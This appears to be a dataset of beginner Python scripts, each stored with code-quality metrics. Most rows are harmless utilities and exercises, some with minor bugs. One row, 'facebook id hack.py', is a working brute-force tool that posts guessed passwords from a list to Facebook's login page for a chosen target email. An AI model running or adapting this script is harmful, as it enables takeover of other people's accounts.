    r.pause_threshold = 1 # a pause of more than 1 second will stop the microphone temporarily
    r.energy_threshold = 300 # python by default sets it to 300. It is the minimum input energy to be considered. 
    r.dynamic_energy_threshold = True # pyhton now can dynamically change the threshold energy

    with sr.Microphone() as source:
        # read the audio data from the default microphone
        print(Fore.RED + ""\nListening..."")
        #time.sleep(0.5)

        speech = r.record(source, duration = 9)  # option 
        #speech = r.listen(source)
        # convert speech to text
        try:
            #print(""Recognizing..."")
            recognizing()
            speech = r.recognize_google(speech)
            print(speech + ""\n"")
        
        except Exception as exception:
            print(exception)
            return ""None""
    return speech

def recognizing():
    """"""Uses the Rich library to print a simulates version of ""recognizing"" by printing a loading bar.
    """"""
    with Progress() as pr:
        rec = pr.add_task(""[red]Recognizing..."", total = 100)
        while not pr.finished:
            pr.update(rec, advance = 1.0)
            time.sleep(0.01)

def long_hear(duration_time = 60):
    """"""[It will process the speech of user using Google_Speech_Recognizer(recognize_google)]
        the difference between the hear() and long_hear() is that - the
        hear() - records users voice for 9 seconds
        long_hear() - will record user's voice for the time specified by user. By default, it records for 60 seconds.
    Returns:
        [str]: [Speech of user as a string in English(en - IN)]
    """"""    
    r = sr.Recognizer()
    """"""Reconizer is a class which has lot of functions related to Speech i/p and o/p.
    """"""
    r.pause_threshold = 1 # a pause of more than 1 second will stop the microphone temporarily
    r.energy_threshold = 300 # python by default sets it to 300. It is the minimum input energy to be considered. 
    r.dynamic_energy_threshold = True # pyhton now can dynamically change the threshold energy

    with sr.Microphone() as source:
        # read the audio data from the default microphone
        print(Fore.RED + ""\nListening..."")
        #time.sleep(0.5)

        speech = r.record(source, duration = duration_time)  # option 
        #speech = r.listen(source)
        # convert speech to text
        try:
            print(Fore.RED +""Recognizing..."")
            #recognizing()
            speech = r.recognize_google(speech)
            #print(speech + ""\n"")
        
        except Exception as exception:
            print(exception)            
            return ""None""
    return speech

def short_hear(duration_time = 5):
    """"""[It will process the speech of user using Google_Speech_Recognizer(recognize_google)]
        the difference between the hear() and long_hear() is that - the
        hear() - records users voice for 9 seconds
        long_hear - will record user's voice for the time specified by user. By default, it records for 60 seconds.
    Returns:
        [str]: [Speech of user as a string in English(en - IN)]
    """"""    
    r = sr.Recognizer()
    """"""Reconizer is a class which has lot of functions related to Speech i/p and o/p.
    """"""
    r.pause_threshold = 1 # a pause of more than 1 second will stop the microphone temporarily
    r.energy_threshold = 300 # python by default sets it to 300. It is the minimum input energy to be considered. 
    r.dynamic_energy_threshold = True # pyhton now can dynamically change the threshold energy

    with sr.Microphone() as source:
        # read the audio data from the default microphone
        print(Fore.RED + ""\nListening..."")
        #time.sleep(0.5)

        speech = r.record(source, duration = duration_time)  # option 
        #speech = r.listen(source)
        # convert speech to text
        try:
            print(Fore.RED +""Recognizing..."")
            #recognizing()
            speech = r.recognize_google(speech)
            #print(speech + ""\n"")
        
        except Exception as exception:
            print(exception)            
            return ""None""
    return speech

        

if __name__ == '__main__':
    # print(""Enter your name"")
    # name = hear()
    # speak(""Hello "" + name)
    # greet(""s"")
    # greet(""e"")
    pass
    #hear()
    #recognizing()
    
",6115,92,83,27,38,25,34,6.0,21,24,8,49.0,36,,73,210.1173000519232,398.5385081605227,5.444444444444445,medio,No,False,False,Medium-High,id32
Random Password Generator.py,"import random

low=""abcdefghijklmnopqrstuvwxyz""
upp=""ABCDEFGHIJKLMNOPQRSTUVWXYZ""
num=""0123456789""
sym=""!@#$%^&*""

all=low+upp+num+sym
length=8
password="""".join(random.sample(all,length))
print(password)

",204,9,9,3,0,0,0,0.0,0,3,1,6.0,6,,9,15.509775004326936,25.26619429851844,0.5,medio,No,False,True,Low,id33
encrypter-decrypter-gui.py,"# ==================== Importing Libraries ====================
# =============================================================
import tkinter as tk
from tkinter import ttk
from tkinter.messagebox import showerror
from tkinter.scrolledtext import ScrolledText

# =============================================================


class Main(tk.Tk):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.title(""Alphacrypter"")
        # ----- Setting Geometry -----
        self.geometry_settings()

    def geometry_settings(self):
        _com_scr_w = self.winfo_screenwidth()
        _com_scr_h = self.winfo_screenheight()
        _my_w = 300
        _my_h = 450
        # ----- Now Getting X and Y Coordinates
        _x = int(_com_scr_w / 2 - _my_w / 2)
        _y = int(_com_scr_h / 2 - _my_h / 2)
        _geo_string = str(_my_w) + ""x"" + str(_my_h) + ""+"" + str(_x) + ""+"" + str(_y)
        self.geometry(_geo_string)
        # ----- Geometry Setting Completed Now Disabling Resize Screen Button -----
        self.resizable(width=False, height=False)


class Notebook:
    def __init__(self, parent):
        self.parent = parent
        # ========== Data Key ==========
        self.data_dic = {
            ""a"": ""q"",
            ""b"": ""w"",
            ""c"": ""e"",
            ""d"": ""r"",
            ""e"": ""t"",
            ""f"": ""y"",
            ""g"": ""u"",
            ""h"": ""i"",
            ""i"": ""o"",
            ""j"": ""p"",
            ""k"": ""a"",
            ""l"": ""s"",
            ""m"": ""d"",
            ""n"": ""f"",
            ""o"": ""g"",
            ""p"": ""h"",
            ""q"": ""j"",
            ""r"": ""k"",
            ""s"": ""l"",
            ""t"": ""z"",
            ""u"": ""x"",
            ""v"": ""c"",
            ""w"": ""v"",
            ""x"": ""b"",
            ""y"": ""n"",
            ""z"": ""m"",
            ""1"": ""_"",
            ""2"": ""-"",
            ""3"": ""|"",
            ""4"": ""?"",
            ""5"": ""*"",
            ""6"": ""!"",
            ""7"": ""@"",
            ""8"": ""#"",
            ""9"": ""$"",
            ""0"": ""~"",
            ""."": ""/"",
            "","": ""+"",
            "" "": ""&"",
        }
        # ==============================
        # ----- Notebook With Two Pages -----
        self.nb = ttk.Notebook(self.parent)
        self.page1 = ttk.Frame(self.nb)
        self.page2 = ttk.Frame(self.nb)
        self.nb.add(self.page1, text=""Encrypt The Words"")
        self.nb.add(self.page2, text=""Decrypt The Words"")
        self.nb.pack(expand=True, fill=""both"")
        # ----- LabelFrames -----
        self.page1_main_label = ttk.LabelFrame(
            self.page1, text=""Encrypt Any Text""
        )  # <----- Page1 LabelFrame1
        self.page1_main_label.grid(row=0, column=0, pady=20, padx=2, ipadx=20)
        self.page1_output_label = ttk.LabelFrame(self.page1, text=""Decrypted Text"")
        self.page1_output_label.grid(row=1, column=0, pady=10, padx=2)

        self.page2_main_label = ttk.LabelFrame(
            self.page2, text=""Decrypt Any Text""
        )  # <----- Page1 LabelFrame1
        self.page2_main_label.grid(row=0, column=0, pady=20, padx=2, ipadx=20)
        self.page2_output_label = ttk.LabelFrame(self.page2, text=""Real Text"")
        self.page2_output_label.grid(row=1, column=0, pady=10, padx=2)
        # <---Scrolled Text Global
        self.decrypted_text_box = ScrolledText(
            self.page1_output_label, width=30, height=5, state=""normal""
        )
        self.decrypted_text_box.grid(row=1, column=0, padx=2, pady=10)

        self.text_box = ScrolledText(
            self.page2_output_label, width=30, height=5, state=""normal""
        )
        self.text_box.grid(row=1, column=0, padx=2, pady=10)
        # ----- Variables -----
        self.user_text = tk.StringVar()
        self.decrypted_user_text = tk.StringVar()

        self.user_text2 = tk.StringVar()
        self.real_text = tk.StringVar()
        # ----- Getting Inside Page1 -----
        self.page1_inside()
        self.page2_inside()

    def page1_inside(self):
        style = ttk.Style()
        user_text_label = ttk.Label(
            self.page1_main_label, text=""Enter Your Text Here : "", font=("""", 14)
        )
        user_text_label.grid(row=0, column=0, pady=10)
        user_entry_box = ttk.Entry(
            self.page1_main_label, width=35, textvariable=self.user_text
        )
        user_entry_box.grid(row=1, column=0)
        style.configure(
            ""TButton"",
            foreground=""black"",
            background=""white"",
            relief=""groove"",
            font=("""", 12),
        )
        encrypt_btn = ttk.Button(
            self.page1_main_label,
            text=""Encrypt Text"",
            style=""TButton"",
            command=self.encrypt_now,
        )
        encrypt_btn.grid(row=2, column=0, pady=15)

    # ---------- Page1 Button Binding Function ----------

    def encrypt_now(self):
        user_text = self.user_text.get()
        if user_text == """":
            showerror(
                ""Nothing Found"", ""Please Enter Something In Entry Box To Encrypt...!""
            )
            return
        else:
            self.decrypted_user_text = self.backend_work(""Encrypt"", user_text)
            self.decrypted_text_box.insert(tk.INSERT, self.decrypted_user_text, tk.END)

    # --------------------------------------------------Binding Functions of Page1 End Here
    # Page2 ------------------>
    def page2_inside(self):
        style = ttk.Style()
        user_text_label = ttk.Label(
            self.page2_main_label, text=""Enter Decrypted Text Here : "", font=("""", 14)
        )
        user_text_label.grid(row=0, column=0, pady=10)
        user_entry_box = ttk.Entry(
            self.page2_main_label, width=35, textvariable=self.user_text2
        )
        user_entry_box.grid(row=1, column=0)
        style.configure(
            ""TButton"",
            foreground=""black"",
            background=""white"",
            relief=""groove"",
            font=("""", 12),
        )
        encrypt_btn = ttk.Button(
            self.page2_main_label,
            text=""Decrypt Text"",
            style=""TButton"",
            command=self.decrypt_now,
        )
        encrypt_btn.grid(row=2, column=0, pady=15)
        # ---------- Page1 Button Binding Function ----------

    def decrypt_now(self):
        user_text = self.user_text2.get()
        if user_text == """":
            showerror(
                ""Nothing Found"", ""Please Enter Something In Entry Box To Encrypt...!""
            )
            return
        else:
            self.real_text = self.backend_work(""Decrypt"", user_text)
            self.text_box.insert(tk.INSERT, self.real_text, tk.END)

    def backend_work(self, todo, text_coming):
        text_to_return = """"
        if todo == ""Encrypt"":
            try:
                text_coming = str(
                    text_coming
                ).lower()  # <----- Lowering the letters as dic in lower letter
                for word in text_coming:
                    for key, value in self.data_dic.items():
                        if word == key:
                            # print(word, "" : "", key)
                            text_to_return += value

            except ValueError:
                showerror(""Unknown"", ""Something Went Wrong, Please Restart Application"")

            return text_to_return
        elif todo == ""Decrypt"":
            try:
                text_coming = str(text_coming).lower()
                for word in text_coming:
                    for key, value in self.data_dic.items():
                        if word == value:
                            text_to_return += key

            except ValueError:
                showerror(""Unknown"", ""Something Went Wrong, Please Restart Application"")

            return text_to_return

        else:
            showerror(""No Function"", ""Function Could not get what to do...!"")


# =============================================================
# ==================== Classes End Here ... ! =================


if __name__ == ""__main__"":
    run = Main()
    Notebook(run)
    run.mainloop()
",8089,110,193,24,23,20,0,8.0,26,21,4,42.0,33,,63,174.46500593882897,328.19556203462383,2.5454545454545454,bajo,Yes,False,False,Low-Medium,id34
merge_sort.py,"def merge(left_list, right_list):
    sorted_list = []
    left_list_index = right_list_index = 0

    # We use the list lengths often, so its handy to make variables
    left_list_length, right_list_length = len(left_list), len(right_list)

    for _ in range(left_list_length + right_list_length):
        if left_list_index < left_list_length and right_list_index < right_list_length:
            # We check which value from the start of each list is smaller
            # If the item at the beginning of the left list is smaller, add it
            # to the sorted list
            if left_list[left_list_index] <= right_list[right_list_index]:
                sorted_list.append(left_list[left_list_index])
                left_list_index += 1
            # If the item at the beginning of the right list is smaller, add it
            # to the sorted list
            else:
                sorted_list.append(right_list[right_list_index])
                right_list_index += 1

        # If we've reached the end of the of the left list, add the elements
        # from the right list
        elif left_list_index == left_list_length:
            sorted_list.append(right_list[right_list_index])
            right_list_index += 1
        # If we've reached the end of the of the right list, add the elements
        # from the left list
        elif right_list_index == right_list_length:
            sorted_list.append(left_list[left_list_index])
            left_list_index += 1

    return sorted_list


def merge_sort(nums):
    # If the list is a single element, return it
    if len(nums) <= 1:
        return nums

    # Use floor division to get midpoint, indices must be integers
    mid = len(nums) // 2

    # Sort and merge each half
    left_list = merge_sort(nums[:mid])
    right_list = merge_sort(nums[mid:])

    # Merge the sorted lists into a new one
    return merge(left_list, right_list)


# Verify it works
random_list_of_nums = [120, 45, 68, 250, 176]
random_list_of_nums = merge_sort(random_list_of_nums)
print(random_list_of_nums)

""""""
Here merge_sort() function, unlike the previous sorting algorithms, returns a new list that is sorted, rather than sorting the existing list.
Therefore, Merge Sort requires space to create a new list of the same size as the input list
""""""
",2307,32,29,12,15,15,4,2.0,9,13,6,26.0,13,19.0,39,63.61549134016113,165.66917302429982,6.0,medio,No,False,False,Low-Medium,id35
facebook id hack.py,"# Author-Kingslayer
# Email-kingslayer8509@gmail.com
# you need to create a file password.txt which contains all possible passwords
import requests
import threading
import urllib.request
import os
from bs4 import BeautifulSoup
import sys

if sys.version_info[0] != 3:
    print(
        """"""--------------------------------------
	REQUIRED PYTHON 3.x
	use: python3 fb.py
--------------------------------------
			""""""
    )
    sys.exit()

post_url = ""https://www.facebook.com/login.php""
headers = {
    ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"",
}
payload = {}
cookie = {}


def create_form():
    form = dict()
    cookie = {""fr"": ""0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy""}

    data = requests.get(post_url, headers=headers)
    for i in data.cookies:
        cookie[i.name] = i.value
    data = BeautifulSoup(data.text, ""html.parser"").form
    if data.input[""name""] == ""lsd"":
        form[""lsd""] = data.input[""value""]
    return (form, cookie)


def function(email, passw, i):
    global payload, cookie
    if i % 10 == 1:
        payload, cookie = create_form()
        payload[""email""] = email
    payload[""pass""] = passw
    r = requests.post(post_url, data=payload, cookies=cookie, headers=headers)
    if ""Find Friends"" in r.text or ""Two-factor authentication required"" in r.text:
        open(""temp"", ""w"").write(str(r.content))
        print(""\npassword is : "", passw)
        return True
    return False


print(""\n---------- Welcome To Facebook BruteForce ----------\n"")
file = open(""passwords.txt"", ""r"")

email = input(""Enter Email/Username : "")

print(""\nTarget Email ID : "", email)
print(""\nTrying Passwords from list ..."")

i = 0
while file:
    passw = file.readline().strip()
    i += 1
    if len(passw) < 6:
        continue
    print(str(i) + "" : "", passw)
    if function(email, passw, i):
        break
",1929,51,57,12,3,3,0,2.0,7,10,7,20.0,19,,30,100.36210720983136,141.01319154423277,3.684210526315789,medio,No,True,False,Low-Medium,id36
iprint.py,"from time import sleep

txt = input("""")

ap = """"

for let in range(len(txt) - 1):
    ap += txt[let]
    print(ap, end=""\r"")
    sleep(0.1)

print(txt, end="""")
",160,8,8,4,0,0,0,0.0,0,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,medio,No,True,False,Low,id37
pythonVideoDownloader.py,"import requests
from bs4 import BeautifulSoup

""""""
URL of the archive web-page which provides link to
all video lectures. It would have been tiring to
download each video manually.
In this example, we first crawl the webpage to extract
all the links and then download videos.
""""""

# specify the URL of the archive here
archive_url = ""http://www-personal.umich.edu/~csev/books/py4inf/media/""


def get_video_links():
    # create response object
    r = requests.get(archive_url)

    # create beautiful-soup object
    soup = BeautifulSoup(r.content, ""html5lib"")

    # find all links on web-page
    links = soup.findAll(""a"")

    # filter the link sending with .mp4
    video_links = [
        archive_url + link[""href""] for link in links if link[""href""].endswith(""mp4"")
    ]

    return video_links


def download_video_series(video_links):
    for link in video_links:

        """"""iterate through all links in video_links
        and download them one by one""""""

        # obtain filename by splitting url and getting
        # last string
        file_name = link.split(""/"")[-1]

        print(""Downloading the file:%s"" % file_name)

        # create response object
        r = requests.get(link, stream=True)

        # download started
        with open(file_name, ""wb"") as f:
            for chunk in r.iter_content(chunk_size=1024 * 1024):
                if chunk:
                    f.write(chunk)

        print(""%s downloaded!\n"" % file_name)

    print(""All videos are downloaded!"")
    return


if __name__ == ""__main__"":
    # getting all video links
    video_links = get_video_links()

    # download all videos
    download_video_series(video_links)
",1672,26,26,20,11,11,9,2.0,7,6,5,11.0,9,,17,40.13896548741762,64.72503367497926,3.055555555555556,alto,No,False,False,Low,id38
classicIndianCardMatch.py,"import random
import time

SUITS = (""C"", ""S"", ""H"", ""D"")
RANKS = (""A"", ""2"", ""3"", ""4"", ""5"", ""6"", ""7"", ""8"", ""9"", ""T"", ""J"", ""Q"", ""K"")
VALUES = {
    ""A"": 1,
    ""2"": 2,
    ""3"": 3,
    ""4"": 4,
    ""5"": 5,
    ""6"": 6,
    ""7"": 7,
    ""8"": 8,
    ""9"": 9,
    ""T"": 10,
    ""J"": 10,
    ""Q"": 10,
    ""K"": 10,
}


class card:
    def __init__(self, suit, rank):
        if (suit in SUITS) and (rank in RANKS):
            self.suit = suit
            self.rank = rank
        else:
            self.suit = None
            self.rank = None
            print(""Invalid card: "", suit, rank)

    def __str__(self):
        return self.suit + self.rank

    def getRank(self):
        return self.rank

    def getSuit(self):
        return self.suit


class deck:
    def __init__(self):
        self.deck = [card(suit, rank) for suit in SUITS for rank in RANKS]

    def shuffle(self):
        random.shuffle(self.deck)

    def dealCard(self):
        return random.choice(self.deck)

    def __str__(self):
        print(self.deck)


# Begin play
# create two decks, one for each player.
print(""Gathering brand new two decks of cards............\n"")
deck1 = deck()
deck2 = deck()
time.sleep(5)
print(""..........decks ready!!!\n"")
print(""Combining and shuffling both the decks.."")
time.sleep(10)
# Shuffle the decks
deck1.shuffle()
deck2.shuffle()
# combine both the shuffled decks
combinedDeck = deck1.deck + deck2.deck
# ReShuffle the combined deck, cut it and distribute to two players.
random.shuffle(combinedDeck)
print(""....decks have been combined and shuffled...\n"")
print(""------------------------------------------\n"")
input(""Enter a key to cut the deck..\n"")
player1 = combinedDeck[0:52]
player2 = combinedDeck[52:]
print(
    ""Deck has been split into two and Human get a half and computer gets the other...\n""
)

# Begin play:
print(""------------------------------------------\n"")
print(""player1 == Human\n"")
print(""player2 == Computer\n"")
print(""------------------------------------------\n"")
print(""player1 goes first...hit any key to place the card on the pile..\n"")

centerPile = []
currentPlayer2Card = None

while (
    len(player1) != 0 and len(player2) != 0
):  # this needs a fix as it goes on an infinite loop on a success.
    switchPlayer = True
    while switchPlayer == True:
        for card in range(len(player1)):
            input(""Enter any key to place a card!!!\n"")
            currentPlayer1Card = player1[card].rank
            print(""Your current card's rank: {}"".format(currentPlayer1Card))
            centerPile.append(player1[card])
            player1.pop(card)
            switchPlayer = False
            if currentPlayer2Card == currentPlayer1Card:
                player1 = player1 + centerPile
                print(
                    ""The human got a match and takes all the cards from center pile..""
                )
            break
    while switchPlayer == False:
        for card in range(len(player2)):
            currentPlayer2Card = player2[card].rank
            print(""Computer's current card's rank: {}"".format(currentPlayer2Card))
            centerPile.append(player2[card])
            player2.pop(card)
            switchPlayer = True
            if currentPlayer1Card == currentPlayer2Card:
                player2 = player2 + centerPile
                print(""Computer got a match and takes all the cards from center pile.."")
            break

print(""GAME OVER!!!\n"")

print(""Human has {} cards and computer has {}.."".format(len(player1), len(player2)))
",3515,83,100,18,7,6,0,8.0,16,14,5,28.0,21,,42,103.8483063527908,197.4184681619259,3.333333333333333,bajo,Yes,True,True,Low-Medium,id39
practice_beautifulsoap.py,"from bs4 import BeautifulSoup
import requests

language_symbols = {}


def lang():
    try:
        response = requests.get(""https://www.wikipedia.org/"")
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')

        for option in soup.find_all('option'):
            language = option.text
            symbol = option['lang']
            language_symbols[language] = symbol

        return list(language_symbols.keys())

    except requests.exceptions.RequestException as e:
        print(""Error fetching language data:"", e)
        return []


def data(selected_topic, selected_language):
    symbol = language_symbols.get(selected_language)

    try:
        url = f""https://{symbol}.wikipedia.org/wiki/{selected_topic}""
        data_response = requests.get(url)
        data_response.raise_for_status()
        data_soup = BeautifulSoup(data_response.content, 'html.parser')

        main_content = data_soup.find('div', {'id': 'mw-content-text'})
        filtered_content = """"

        if main_content:
            for element in main_content.descendants:
                if element.name in ['h1', 'h2', 'h3', 'h4', 'h5', 'h6']:
                    filtered_content += ""\n"" + element.get_text(strip=True).upper() + ""\n""

                elif element.name == 'p':
                    filtered_content += element.get_text(strip=True) + ""\n""

        return filtered_content

    except requests.exceptions.RequestException as e:
        print(""Error fetching Wikipedia content:"", e)
        return ""Error fetching data.""


def get_image_urls(query):
    try:
        search_url = f""https://www.google.com/search?q={query}&tbm=isch""
        image_response = requests.get(search_url)
        image_response.raise_for_status()
        image_soup = BeautifulSoup(image_response.content, 'html.parser')

        image_urls = []
        for img in image_soup.find_all('img'):
            image_url = img.get('src')
            if image_url and image_url.startswith(""http""):
                image_urls.append(image_url)

        return image_urls[0]

    except requests.exceptions.RequestException as e:
        print(""Error fetching image URLs:"", e)
        return None
",2212,51,50,19,0,0,0,3.0,14,8,4,16.0,12,,24,51.01955000865388,96.0,2.6666666666666665,bajo,No,False,False,Low,id40
crc.py,"def crc_check(data, div):
    l = len(div)
    ct = 0
    data = [int(i) for i in data]
    div = [int(i) for i in div]
    zero = [0 for i in range(l)]
    temp_data = [data[i] for i in range(l)]
    result = []
    for j in range(len(data) - len(div) + 1):
        print(""Temp_dividend"", temp_data)
        msb = temp_data[0]
        if msb == 0:
            result.append(0)
            for i in range(l - 1, -1, -1):
                temp_data[i] = temp_data[i] ^ zero[i]
        else:
            result.append(1)
            for i in range(l - 1, -1, -1):
                temp_data[i] = temp_data[i] ^ div[i]
        temp_data.pop(0)
        if l + j < len(data):
            temp_data.append(data[l + j])
    crc = temp_data
    print(""Quotient: "", result, ""remainder"", crc)
    return crc


# returning crc value


while 1 > 0:
    print(""Enter data: "")
    data = input()  # can use it like int(input())
    print(""Enter divisor"")
    div = input()  # can use it like int(input())
    original_data = data
    data = data + (""0"" * (len(div) - 1))
    crc = crc_check(data, div)
    crc_str = """"
    for c in crc:
        crc_str += c
    print(""Sent data: "", original_data + crc_str)
    sent_data = original_data + crc_str
    print(
        ""If again applying CRC algorithm, the remainder/CRC must be zero if errorless.""
    )
    crc = crc_check(sent_data, div)
    remainder = crc
    print(""Receiver side remainder: "", remainder)
    print(""Continue [Y/N]:"")
    ch = input()
    if ch == ""N"" or ch == ""n"":
        break
    else:
        continue
",1616,48,50,4,3,1,0,,10,24,9,44.0,29,,68,169.41077387168042,356.8590709141638,6.827586206896552,medio,No,True,False,Medium-High,id41
Python Program to Reverse a linked list.py,"# Python program to reverse a linked list 
# Time Complexity : O(n) 
# Space Complexity : O(1) 

# Node class 
class Node: 

	# Constructor to initialize the node object 
	def __init__(self, data): 
		self.data = data 
		self.next = None

class LinkedList: 

	# Function to initialize head 
	def __init__(self): 
		self.head = None

	# Function to reverse the linked list 
	def reverse(self): 
		prev = None
		current = self.head 
		while(current is not None): 
			next = current.next
			current.next = prev 
			prev = current 
			current = next
		self.head = prev 
		
	# Function to insert a new node at the beginning 
	def push(self, new_data): 
		new_node = Node(new_data) 
		new_node.next = self.head 
		self.head = new_node 

	# Utility function to print the linked LinkedList 
	def printList(self): 
		temp = self.head 
		while(temp): 
			print(temp.data)
			temp = temp.next


# Driver program to test above functions 
llist = LinkedList() 
llist.push(20) 
llist.push(4) 
llist.push(15) 
llist.push(85) 

print(""Given Linked List"")
llist.printList() 
llist.reverse() 
print(""\nReversed Linked List"")
llist.printList() 

# This code is contributed by Nikhil Kumar Singh(nickzuck_007) 
",1191,35,35,11,11,11,0,,11,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,Yes,False,False,Low,id42
wiki.py,"# In this program you ask it about any topic and it will show you the data from wikipedia
# pip install wikipedia

import wikipedia
import tkinter as tk
from tkinter import Label, Button, Entry, Text, messagebox, SOLID, GROOVE, StringVar, WORD, END
#import PIL as ImageTK
from tkinter import messagebox


class main():
    def __init__(self, root):
        self.root = root

        self.root.title(""WIKIPEDIA SEARCH"")
        self.root.geometry(""1920x1080"")

        self.lbl1 = Label(
                root,
                text=""WIKIPEDIA SUMMARY"",
                font=(""Verdana"", 25, ""bold""),
                width=50,
                bg=""yellow"",
                fg=""red"",
                relief=SOLID,
        )
        self.lbl1.pack(padx=10, pady=15)

        self.question = StringVar()

        self.quesbox = Entry(
            root,
            text=""TELL ME YOUR QUESTION"",
            font=(""Verdana"", 20, ""italic""),
            width=80,
            textvariable=self.question,
            relief=GROOVE,
            bd=10,
        )
        self.quesbox.pack()

        self.searchbtn = Button(
            root,
            text=""SEARCH"",
            font=(""Callibri"", 18, ""bold""),
            width=30,
            relief=GROOVE,
            bg=""#4cd137"",
            bd=3,
            command=lambda:self.summary(""None""),
        )
        self.searchbtn.pack()

        self.answer = Text(
            root,
            height=100,
            width=160,
            font=(""Arial"", 14),
            wrap=WORD,
            bg=""#7CEBC6"",
            fg=""black"",
        )

        self.root.bind(""<Return>"", self.summary)

    def summary(self, event):
        self.searchbtn[""text""] = ""Searching...""
        try:
            self.query = wikipedia.page(self.question.get(), auto_suggest=True)
            self.quesbox.delete(0, 'end')
            self.answer.delete('1.0', END)
            self.answer.insert(END, (self.query.summary))

            self.answer.pack()
        except Exception as e:
            error_msg = f""{e}""
            messagebox.showerror(""Error"", error_msg)

        self.searchbtn[""text""] = ""Search""


        # Wikipeida page returns to many pages

if __name__ == ""__main__"":
    root = tk.Tk()
    main(root)
    root.mainloop()
",2276,35,67,16,4,4,0,2.0,6,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,medio,Yes,False,False,Low,id43
recursionVisualizer.py,"import turtle
import random

t = turtle.Turtle()
num = random.randint(1, 1000)
t.right(num)
t.speed(num)
t.left(num)


def tree(i):
    if i < 10:
        return
    else:
        t.right(15)
        t.forward(15)
        t.left(20)
        t.backward(20)
        tree(2 * i / 5)
        t.left(2)
        tree(3 * i / 4)
        t.left(2)
        tree(i / 2)
        t.backward(num / 5)
        tree(random.randint(1, 100))
        tree(random.randint(1, num))
        tree(random.randint(1, num / 2))
        tree(random.randint(1, num / 3))
        tree(random.randint(1, num / 2))
        tree(random.randint(1, num))
        tree(random.randint(1, 100))
        t.forward(num / 5)
        t.right(2)
        tree(3 * i / 4)
        t.right(2)
        tree(2 * i / 5)
        t.right(2)
        t.left(10)
        t.backward(10)
        t.right(15)
        t.forward(15)
        print(""tree execution complete"")


def cycle(i):
    if i < 10:
        return
    else:
        try:
            tree(random.randint(1, i))
            tree(random.randint(1, i * 2))
        except:
            print(""An exception occured"")
        else:
            print(""No Exception occured"")
        print(""cycle loop complete"")


def fractal(i):
    if i < 10:
        return
    else:
        cycle(random.randint(1, i + 1))
        cycle(random.randint(1, i))
        cycle(random.randint(1, i - 1))
        cycle(random.randint(1, i - 2))
        print(""fractal execution complete"")


fractal(random.randint(1, 200))
print(""Execution complete"")
turtle.done()
",1552,63,63,9,0,0,0,3.0,8,21,5,42.0,18,,63,86.66829050039843,284.98440323159184,5.833333333333333,bajo,No,False,True,Medium,id44
AreaOfTriangle.py,"# Python Program to find the area of triangle when all three side-lengths are known!

a = 5
b = 6
c = 7

# Uncomment below to take inputs from the user
# a = float(input('Enter first side: '))
# b = float(input('Enter second side: '))
# c = float(input('Enter third side: '))

# calculate the semi-perimeter
s = (a + b + c) / 2

# calculate the area
area = (s * (s - a) * (s - b) * (s - c)) ** 0.5
print(""The area of the triangle is: "" + area)
",444,6,6,4,7,7,0,,0,11,5,22.0,16,,33,75.60964047443682,144.94647495169912,3.4375,alto,No,True,False,Low,id45
fetch_news.py,"import requests

_NEWS_API = ""https://newsapi.org/v1/articles?source=bbc-news&sortBy=top&apiKey=""


def fetch_bbc_news(bbc_news_api_key: str) -> None:
    # fetching a list of articles in json format
    bbc_news_page = requests.get(_NEWS_API + bbc_news_api_key).json()
    # each article in the list is a dict
    for news, article in enumerate(bbc_news_page[""articles""], 1):
        print(f""{news}.) {article['title']}"")


if __name__ == ""__main__"":
    fetch_bbc_news(bbc_news_api_key=""<Your BBC News API key goes here>"")
",525,8,8,5,2,2,0,1.0,2,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,alto,No,False,False,Low,id46
SimpleStopWatch.py,"# Author: OMKAR PATHAK
# This script helps to build a simple stopwatch application using Python's time module.

import time

print(""Press ENTER to begin, Press Ctrl + C to stop"")
while True:
    try:
        input()  # For ENTER. Use raw_input() if you are running python 2.x instead of input()
        starttime = time.time()
        print(""Started"")
        while True:
            print(""Time Elapsed: "", round(time.time() - starttime, 0), ""secs"", end=""\r"")
            time.sleep(1)  # 1 second delay
    except KeyboardInterrupt:
        print(""Stopped"")
        endtime = time.time()
        print(""Total Time:"", round(endtime - starttime, 2), ""secs"")
        break
",672,15,15,2,4,2,0,0.0,0,2,1,4.0,3,,6,4.754887502163469,12.0,0.6666666666666666,alto,No,True,False,Low,id47
utils.py,"import os

import cv2


# source: https://stackoverflow.com/a/44659589
def image_resize(image, width=None, height=None, inter=cv2.INTER_AREA):
    # initialize the dimensions of the image to be resized and
    # grab the image size
    dim = None
    (h, w) = image.shape[:2]
    # if both the width and height are None, then return the
    # original image
    if width is None and height is None:
        return image
    # check to see if the width is None
    if width is None:
        # calculate the ratio of the height and construct the
        # dimensions
        r = height / float(h)
        dim = (int(w * r), height)
    # otherwise, the height is None
    else:
        # calculate the ratio of the width and construct the
        # dimensions
        r = width / float(w)
        dim = (width, int(h * r))

    # resize the image
    resized = cv2.resize(image, dim, interpolation=inter)
    # return the resized image
    return resized


class CFEVideoConf(object):
    # Standard Video Dimensions Sizes
    STD_DIMENSIONS = {
        ""360p"": (480, 360),
        ""480p"": (640, 480),
        ""720p"": (1280, 720),
        ""1080p"": (1920, 1080),
        ""4k"": (3840, 2160),
    }
    # Video Encoding, might require additional installs
    # Types of Codes: http://www.fourcc.org/codecs.php
    VIDEO_TYPE = {
        ""avi"": cv2.VideoWriter_fourcc(*""XVID""),
        # 'mp4': cv2.VideoWriter_fourcc(*'H264'),
        ""mp4"": cv2.VideoWriter_fourcc(*""XVID""),
    }

    width = 640
    height = 480
    dims = (640, 480)
    capture = None
    video_type = None

    def __init__(self, capture, filepath, res=""480p"", *args, **kwargs):
        self.capture = capture
        self.filepath = filepath
        self.width, self.height = self.get_dims(res=res)
        self.video_type = self.get_video_type()

    # Set resolution for the video capture
    # Function adapted from https://kirr.co/0l6qmh
    def change_res(self, width, height):
        self.capture.set(3, width)
        self.capture.set(4, height)

    def get_dims(self, res=""480p""):
        width, height = self.STD_DIMENSIONS[""480p""]
        if res in self.STD_DIMENSIONS:
            width, height = self.STD_DIMENSIONS[res]
        self.change_res(width, height)
        self.dims = (width, height)
        return width, height

